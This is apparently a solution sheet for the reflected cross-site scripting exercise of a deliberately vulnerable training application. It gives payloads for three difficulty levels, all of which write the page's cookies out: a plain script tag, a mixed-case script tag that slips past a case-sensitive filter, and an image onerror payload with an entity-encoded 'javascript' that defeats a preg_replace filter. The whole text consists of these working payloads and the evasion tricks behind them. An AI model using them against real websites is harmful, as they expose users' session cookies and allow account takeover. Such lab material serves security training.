# XSS (Reflected)

## low

```
<script>document.write(document.cookie)</script>
```

## medium

```
<sCript>document.write(document.cookie)</sCript>
```

## high

bypass preg_replace()

```
<img src="" onerror="javascri&#112;t:document.write(document.cookie)">
```
